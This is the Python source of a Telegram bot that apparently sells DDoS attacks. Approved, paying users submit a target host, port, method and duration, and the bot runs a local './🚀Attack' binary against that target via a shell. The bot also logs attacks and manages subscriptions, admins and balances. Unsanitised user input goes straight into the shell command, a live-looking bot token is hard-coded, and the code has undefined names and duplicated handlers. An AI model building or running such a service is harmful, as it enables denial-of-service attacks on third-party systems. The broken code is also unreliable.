import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime, timedelta
import os
from dateutil.relativedelta import relativedelta
import subprocess
import time
import random
import string

# Replace with your bot token and owner ID
TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
YOUR_OWNER_ID = 5628960731  # Replace with your actual owner ID

bot = telebot.TeleBot("7391673180:AAGjD09cFRiucnGehptb2Y0rXFzF3u4XP8A")
# Paths to data files
USERS_FILE = 'users.txt'
BALANCE_FILE = 'balance.txt'
ADMINS_FILE = 'admins.txt'
ATTACK_LOGS_FILE = 'log.txt'
CO_OWNER_FILE = 'co_owner.txt'

# Initialize global variables
authorized_users = {}
user_balances = {}
admins = set()
co_owner = None
bgmi_cooldown = {}
DEFAULT_COOLDOWN = 3  # Default cooldown time in seconds
MAX_ATTACK_DURATION = 500  # Maximum attack duration in seconds


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Load authorized users from the file
def load_authorized_users():
    global co_owner
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as file:
            for line in file:
                user_id, expiry = line.strip().split(',')
                authorized_users[int(user_id)] = datetime.fromisoformat(expiry)

    if os.path.exists(BALANCE_FILE):
        with open(BALANCE_FILE, 'r') as f:
            for line in f:
                try:
                    username, user_id, balance = line.strip().split(', ')
                    user_balances[int(user_id)] = {'username': username, 'balance': int(balance)}
                except ValueError:
                    print(f"Skipping malformed line in {BALANCE_FILE}: {line}")

    if os.path.exists(ADMINS_FILE):
        with open(ADMINS_FILE, 'r') as f:
            admins.update(int(line.strip()) for line in f)

    if os.path.exists(CO_OWNER_FILE):
        with open(CO_OWNER_FILE, 'r') as f:
            co_owner = int(f.read().strip())

# Save authorized users to the file
def save_authorized_users():
    with open(USERS_FILE, 'w') as file:
        for user_id, expiry in authorized_users.items():
            file.write(f"{user_id},{expiry.isoformat()}\n")

def save_balances():
    with open(BALANCE_FILE, 'w') as f:
        for user_id, info in user_balances.items():
            f.write(f"{info['username']}, {user_id}, {info['balance']}\n")

def save_admins():
    with open(ADMINS_FILE, 'w') as f:
        for admin_id in admins:
            f.write(f"{admin_id}\n")

def save_co_owner():
    with open(CO_OWNER_FILE, 'w') as f:
        if co_owner:
            f.write(f"{co_owner}\n")
        else:
            f.write("")

# Function to log command to the file
def log_command(user_id, IP, port, duration):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(ATTACK_LOGS_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nIP: {IP}\nPort: {port}\nTime: {duration}\n\n")

# Function to handle the main menu
@bot.message_handler(commands=['start', 'menu'])
def send_welcome(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn_attack = telebot.types.KeyboardButton('🚀 Attack')
    markup.row(btn_attack)
    btn_info = telebot.types.KeyboardButton('ℹ️ My Info')
    markup.row( btn_info)
    bot.send_message(message.chat.id, "Welcome to the attack bot!", reply_markup=markup)

# Check if user is authorized
def is_authorized(user_id):
    return user_id in authorized_users and authorized_users[user_id] > datetime.now()


# # Function to handle attack button 
@bot.message_handler(func=lambda message: message.text == '🚀 Attack')
def process_attack_details(message):
    user_id = message.from_user.id
    if is_authorized(user_id):
        msg = bot.send_message(message.chat.id, "Please provide the details in the following format:\n<method> <host> <port> <time>")
        bot.register_next_step_handler(msg, get_attack_details)
    else:
        response = """🚫 Unauthorized Access! 🚫
Oops! It seems like you don't have permission to use the attack command. To gain access and unleash the power of attacks, you can:

👉 Contact an Admin or the Owner for approval.
🌟 Become a proud supporter and purchase approval.
💬 Chat with an admin now and level up your capabilities!

🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!"""
        bot.reply_to(message, response)

def get_attack_details(message):
    user_id = message.from_user.id
    if is_authorized(user_id):
        try:
            command = message.text.split()
            if len(command) == 4:
                method = command[0]
                target = command[1]
                port = int(command[2])
                duration = int(command[3])
                if duration > MAX_ATTACK_DURATION:
                    response = f"Invalid time limit. The attack time must be less than or equal to {MAX_ATTACK_DURATION} seconds."
                    bot.reply_to(message, response)
                else:
                    log_command(user_id, target, port, duration)
                    start_attack_reply(message, method, target, port, duration)
                    full_command = f"./🚀Attack {target} {port} {duration} 200 --method {method}"
                    subprocess.run(full_command, shell=True)
                    attack_finished_reply(message, target, port, duration)
        except ValueError:
            response = "Error: Port and time must be integers."
            bot.reply_to(message, response)
    else:
        response = "You are not authorized to perform this action."
        bot.reply_to(message, response)

def start_attack_reply(message, method, target, port, duration):
    reply_message = (
        f"🚀 **Attack Initiated!** 🚀\n\n"
        f"🔹 **Target:** `{target}:{port}`\n"
        f"⏱️ **Duration:** `{duration} seconds`\n"
        f"🔧 **Method:** `{method.upper()}`\n\n"
        f"🔥 **Status:** `Attack has started` "
    )
    sent_message = bot.send_message(message.chat.id, reply_message, parse_mode='Markdown')
    return sent_message

def update_attack_message(sent_message, status_text):
    bot.edit_message_text(chat_id=sent_message.chat.id, message_id=sent_message.message_id, text=status_text, parse_mode='Markdown')

def execute_attack(message, method, target, port, duration):
    sent_message = start_attack_reply(message, method, target, port, duration)
    attack_command = f"./🚀Attack {target} {port} {duration} 200 --method {method}"
    max_dots = 8
    current_dots = 0
    end_time = time.time() + duration
    while time.time() < end_time:
        dots = '.' * current_dots
        status_text = (
            f"🚀 **Attack Initiated!** 🚀\n\n"
            f"🔹 **Target:** `{target}:{port}`\n"
            f"⏱️ **Duration:** `{duration} seconds`\n"
            f"🔧 **Method:** `{method.upper()}`\n\n"
            f"🔥 **Status:** `Attack has started{dots}`"
        )
        update_attack_message(sent_message, status_text)
        current_dots = (current_dots + 1) % (max_dots + 1)
        time.sleep(0.5)  # Update every 0.5 seconds

    subprocess.run(attack_command, shell=True)
    attack_finished_reply(message, target, port, duration)

def attack_finished_reply(message, target, port, duration):
    reply_message = (
        f"🚀 **Attack Finished Successfully!** 🚀\n\n"
        f"🗿 **Target:** `{target}:{port}`\n"
        f"🕦 **Duration:** `{duration} seconds`\n"
        f"🔥 **Status:** `Attack has finished.` 🔥"
    )
    bot.send_message(message.chat.id, reply_message, parse_mode='Markdown')


# Function to handle "ℹ️ My Info" button press
@bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
def my_info(message):
    user_id = message.from_user.id
    role = "User"
    if user_id == YOUR_OWNER_ID:
        role = "🚀OWNER🚀"
    elif user_id == co_owner:
        role = "🛸CO-OWNER🛸"
    elif user_id in admins:
        role = "Admin"

    if user_id in authorized_users:
        expiry_date = authorized_users[user_id]
        response = (f"👤 User Info 👤\n\n"
                    f"🔖 Role: {role}\n"
                    f"🆔 User ID: {user_id}\n"
                    f"👤 Username: @{username}\n"
                    f"⏳ Approval Expiry: {expiry_date}")
    else:
        username = message.from_user.username if message.from_user.username else "Not Available"
        response = (f"👤 User Info 👤\n\n"
                    f"🔖 Role: {role}\n"
                    f"🆔 User ID: {user_id}\n"
                    f"👤 Username: @{username}\n"
                    f"⏳ Approval Expiry: Not Approved")
    bot.send_message(message.chat.id, response)

def parse_duration(duration_text):
    duration = int(duration_text[:-1])
    unit = duration_text[-1]
    if unit == 'd':
        return timedelta(days=duration)
    elif unit == 'h':
        return timedelta(hours=duration)
    elif unit == 'm':
        return timedelta(month=duration)
    else:
        raise ValueError("Invalid duration unit. Use 'd' for days, 'h' for hours, or 'm' for month.")


@bot.message_handler(commands=['checksubscription'])
def check_subscription(message):
    user_id = message.from_user.id
    if user_id in authorized_users:
        expiry = authorized_users[user_id]
        expiry_date = expiry.strftime('%Y-%m-%d %H:%M:%S')
        remaining_days = (expiry - datetime.now()).days
        response = (f"Your subscription details:\n"
                    f"🔹 Expiry Date: {expiry_date}\n"
                    f"🔹 Days Remaining: {remaining_days} days")
    else:
        response = "You do not have an active subscription. Please contact an admin to subscribe."
    bot.send_message(message.chat.id, response)


@bot.message_handler(commands=['approve'])
def approve_user(message):
    if message.from_user.id == YOUR_OWNER_ID:
        msg = bot.send_message(message.chat.id, "Please specify the user ID and duration (e.g., '123456789 1d').")
        bot.register_next_step_handler(msg, process_approval)
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

def process_approval(message):
    try:
        user_id_text, duration_text = message.text.split()
        user_id = int(user_id_text.strip())
        duration = parse_duration(duration_text)

        # Calculate the new expiry date
        if user_id in authorized_users and authorized_users[user_id] > datetime.now():
            new_expiry = authorized_users[user_id] + duration
        else:
            new_expiry = datetime.now() + duration

        authorized_users[user_id] = new_expiry
        save_authorized_users()

        # Adding user to allowed_user_ids if not already present
        if user_id not in authorized_users:
           is_authorized(user_id) 
        with open(USERS_FILE, "a") as file:
                file.write(f"{user_id}\n")

        user_info = bot.get_chat(user_id)
        username = user_info.username if user_info.username else f"ID: {user_id}"
        bot.send_message(message.chat.id, f"User @{username} (ID: {user_id}) has been approved for {duration_text}.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error processing approval: {str(e)}")

# Function to remove approval
@bot.message_handler(commands=['removeapproval'])
def remove_approval(message):
    if message.from_user.id == YOUR_OWNER_ID or message.from_user.id == co_owner:
        msg = bot.send_message(message.chat.id, "Please specify the user ID to remove approval (e.g., '123456789').")
        bot.register_next_step_handler(msg, process_remove_approval)
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

def process_remove_approval(message):
    try:
        user_id = int(message.text.strip())
        if user_id in admins:
            chat_info = bot.get_chat(user_id)
            username = chat_info.username or chat_info.first_name or chat_info.last_name or "User"
            admins.remove(user_id)
            save_admins()
            bot.send_message(message.chat.id, f"User @{username} (ID: {user_id}) has been removed.")
        else:
            bot.send_message(message.chat.id, "User ID not found in admin list.")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid user ID format. Please provide a valid user ID.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)



# Function to add an admin
@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    if message.from_user.id in {YOUR_OWNER_ID, co_owner}:
        msg = bot.send_message(message.chat.id, "Please specify the user ID and initial balance for the new admin (e.g., 'user_id balance').")
        bot.register_next_step_handler(msg, process_add_admin)
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

def process_add_admin(message):
    try:
        user_id_text, balance_text = message.text.split(maxsplit=1)
        user_id = int(user_id_text.strip())
        balance = int(balance_text.strip())

        admins.add(user_id)
        user_balances[user_id] = {'username': bot.get_chat(user_id).username or "Unknown", 'balance': balance}
        save_admins()
        save_balances()

        bot.send_message(message.chat.id, f"User @{bot.get_chat(user_id).username} (ID: {user_id}) added as an admin with balance of {balance}.")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid input format. Please try again with 'user_id balance' (e.g., '123456789 100').")

# Function to remove an admin
@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    if message.from_user.id in {YOUR_OWNER_ID, co_owner}:
        msg = bot.send_message(message.chat.id, "Please specify the user ID of the admin to remove.")
        bot.register_next_step_handler(msg, process_remove_admin)
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

def process_remove_admin(message):
    try:
        user_id = int(message.text.strip())
        if user_id in admins:
            admins.remove(user_id)
            save_admins()
            bot.send_message(message.chat.id, f"User with ID {user_id} removed from admins.")
        else:
            bot.send_message(message.chat.id, "User ID not found in admin list.")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid user ID format. Please provide a valid user ID.")


# Function to add a co-owner
@bot.message_handler(commands=['addco'])
def add_co_owner(message):
    if message.from_user.id == YOUR_OWNER_ID:
        msg = bot.send_message(message.chat.id, "Please specify the user ID to add as co-owner (e.g., '123456789').")
        bot.register_next_step_handler(msg, process_add_co_owner)
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

def process_add_co_owner(message):
    try:
        user_id = int(message.text.strip())
        chat_info = bot.get_chat(user_id)
        username = chat_info.username or chat_info.first_name or chat_info.last_name or "User"
        
        global co_owner
        co_owner = user_id
        save_co_owner()
        bot.send_message(message.chat.id, f"User @{username} (ID: {user_id}) has been added as co-owner.")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid user ID format. Please provide a valid user ID.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

# Function to remove a co-owner
@bot.message_handler(commands=['removeco'])
def remove_co_owner(message):
    if message.from_user.id == YOUR_OWNER_ID:
        try:
            global co_owner
            if co_owner is not None:
                chat_info = bot.get_chat(co_owner)
                username = chat_info.username or chat_info.first_name or chat_info.last_name or "User"
                co_owner = None
                save_co_owner()
                bot.send_message(message.chat.id, f"User @{username} (ID: {chat_info.id}) has been removed as co-owner.")
            else:
                bot.send_message(message.chat.id, "There is no co-owner to remove.")
        except Exception as e:
            bot.send_message(message.chat.id, f"An error occurred: {str(e)}")
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

# Function to list all admins
@bot.message_handler(commands=['alladmins'])
def list_all_admins(message):
    if message.from_user.id in {YOUR_OWNER_ID, co_owner} or message.from_user.id in admins:
        if admins:
            response = "List of all admins:\n" + "\n".join(str(admin_id) for admin_id in admins)
        else:
            response = "No admins found."
    else:
        response = "You don't have permission to use this command."
    bot.send_message(message.chat.id, response)

# Function to send logs
@bot.message_handler(commands=['logs'])
def send_logs(message):
    if message.from_user.id in {YOUR_OWNER_ID, co_owner} or message.from_user.id in admins:
        if os.path.exists(ATTACK_LOGS_FILE):
            with open(ATTACK_LOGS_FILE, 'r') as f:
                logs = f.read()
            bot.send_message(message.chat.id, f"Attack logs:\n{logs}")
        else:
            bot.send_message(message.chat.id, "No logs found.")
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")



@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    if message.from_user.id in admins or message.from_user.id in {YOUR_OWNER_ID, co_owner}:
        msg = bot.send_message(message.chat.id, "Please specify the user ID and the amount to add (e.g., 'user_id amount').")
        bot.register_next_step_handler(msg, process_add_balance)
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

def process_add_balance(message):
    try:
        user_id_text, amount_text = message.text.split(maxsplit=1)
        user_id = int(user_id_text.strip())
        amount = int(amount_text.strip())

        if user_id in user_balances:
            user_balances[user_id]['balance'] += amount
        else:
            username = "Unknown"
            user_balances[user_id] = {'username': username, 'balance': amount}

        save_balances()

        username = user_balances[user_id]['username']
        bot.send_message(message.chat.id, f"Added {amount} balance to @{username} (ID: {user_id}).")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid input format. Please try again with 'user_id amount' (e.g., '123456789 100').")

@bot.message_handler(commands=['removebalance'])
def remove_balance(message):
    if message.from_user.id in admins or message.from_user.id in {YOUR_OWNER_ID, co_owner}:
        msg = bot.send_message(message.chat.id, "Please specify the user ID and the amount to remove (e.g., 'user_id amount').")
        bot.register_next_step_handler(msg, process_remove_balance)
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

def process_remove_balance(message):
    try:
        user_id_text, amount_text = message.text.split(maxsplit=1)
        user_id = int(user_id_text.strip())
        amount = int(amount_text.strip())

        if user_id in user_balances and user_balances[user_id]['balance'] >= amount:
            user_balances[user_id]['balance'] -= amount
            save_balances()
            username = user_balances[user_id]['username']
            bot.send_message(message.chat.id, f"Removed {amount} balance from @{username} (ID: {user_id}).")
        else:
            bot.send_message(message.chat.id, "Invalid user ID or insufficient balance.")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid input format. Please try again with 'user_id amount' (e.g., '123456789 100').")

@bot.message_handler(commands=['allusers'])
def all_users(message):
    if message.from_user.id in admins or message.from_user.id in {YOUR_OWNER_ID, co_owner}:
        if authorized_users:
            response = "📋 List of all authorized users:\n\n"
            for user_id, info in authorized_users.items():
                response += f"🆔 User ID: `{user_id}`\n"
                response += f"👤 Username: @{info['username']}\n"
                response += f"⏳ Approval Expiry: {info['expiry']}\n\n"
            bot.send_message(message.chat.id, response, parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "No authorized users found.")
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

@bot.message_handler(commands=['leaderboard'])
def show_leaderboard(message):
    if not user_balances:
        bot.send_message(message.chat.id, "No users found in the leaderboard.")
        return

    sorted_users = sorted(user_balances.items(), key=lambda x: x[1]['balance'], reverse=True)
    leaderboard_text = "🏆 Leaderboard 🏆\n\n"
    for i, (user_id, info) in enumerate(sorted_users, start=1):
        leaderboard_text += f"{i}. @{info['username']} - {info['balance']} units\n"

    bot.send_message(message.chat.id, leaderboard_text)

@bot.message_handler(commands=['checkbalance'])
def check_balance(message):
    user_id = message.from_user.id
    if user_id in user_balances:
        balance_info = user_balances[user_id]
        balance = balance_info['balance']
        response = f"💰 Balance Info 💰\n\n👤 User ID: {user_id}\n💵 Balance: {balance}"
    else:
        response = "Balance information not found. Please ensure you are an approved user."
    bot.reply_to(message, response)




# Function to check the balance of a user
@bot.message_handler(commands=['checkbalance'])
def check_balance(message):
    user_id = message.from_user.id
    if user_id in user_balances:
        balance_info = user_balances[user_id]
        balance = balance_info['balance']
        response = f"💰 Balance Info 💰\n\n👤 User ID: {user_id}\n💵 Balance: {balance}"
    else:
        response = "Balance information not found. Please ensure you are an approved user."
    bot.reply_to(message, response)



# Function to check the balance of a user
@bot.message_handler(commands=['checkbalance'])
def check_balance(message):
    user_id = message.from_user.id
    if user_id in user_balances:
        balance_info = user_balances[user_id]
        balance = balance_info['balance']
        response = f"💰 Balance Info 💰\n\n👤 User ID: {user_id}\n💵 Balance: {balance}"
    else:
        response = "Balance information not found. Please ensure you are an approved user."
    bot.reply_to(message, response)

        

# Start polling
bot.infinity_polling()